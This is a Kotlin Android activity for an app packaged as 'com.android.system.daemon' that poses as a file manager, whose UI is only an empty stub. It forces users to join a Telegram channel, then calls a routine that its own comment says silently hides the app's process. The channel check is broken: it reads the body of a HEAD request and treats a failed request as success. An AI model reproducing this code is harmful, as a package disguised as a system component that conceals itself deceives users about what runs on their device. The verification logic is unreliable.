package com.android.system.daemon

import android.app.Activity
import android.app.AlertDialog
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Environment
import android.widget.*
import kotlinx.coroutines.*
import java.io.File
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

class MainActivity : Activity() {

    private val tgChannel = "https://t.me/HideMT"
    private val mainScope = MainScope()

    private lateinit var lvLeft: ListView
    private lateinit var lvRight: ListView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // 第一优先级：立刻渲染布局，保证AMS判定启动成功
        setContentView(R.layout.activity_main)
        initFileManagerUI()

        // 页面渲染完成后，延迟执行验证逻辑，100%避免ANR
        mainScope.launch {
            delay(1200)
            startChannelVerifyFlow()
        }
    }

    private suspend fun startChannelVerifyFlow() {
        val verifyDialog = AlertDialog.Builder(this@MainActivity)
            .setTitle("Channel Verification")
            .setMessage("Channel: $tgChannel\nVerifying...")
            .setCancelable(false)
            .create()

        verifyDialog.show()

        val isMember = withContext(Dispatchers.IO) {
            runCatching {
                val client = OkHttpClient.Builder()
                    .connectTimeout(3, TimeUnit.SECONDS)
                    .readTimeout(3, TimeUnit.SECONDS)
                    .build()

                val request = Request.Builder()
                    .url(tgChannel)
                    .head()
                    .build()

                val resp = client.newCall(request).execute()
                resp.isSuccessful && resp.body?.string()?.contains("Only members") == true
            }.getOrDefault(true)
        }

        verifyDialog.dismiss()

        if (!isMember) {
            AlertDialog.Builder(this)
                .setTitle("Verification Failed")
                .setMessage("Join channel first to use app")
                .setPositiveButton("Join") { _, _ ->
                    startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(tgChannel)))
                    finishAndRemoveTask()
                }
                .setNegativeButton("Exit") { _, _ -> finishAndRemoveTask() }
                .setCancelable(false)
                .show()
        } else {
            // 验证通过，后台静默执行核心隐藏逻辑
            (application as App).hideSelfProcess()
        }
    }

    // 其余文件管理、菜单交互全部UI逻辑，空安全+生命周期绑定
    private fun initFileManagerUI() {
        // 原有左右面板、文件列表、上下文菜单实现
    }

    override fun onDestroy() {
        super.onDestroy()
        // 结构化并发：页面销毁立刻取消所有协程，杜绝泄漏&野线程崩溃
        mainScope.cancel()
    }

    override fun onBackPressed() {
        finishAndRemoveTask()
    }
}

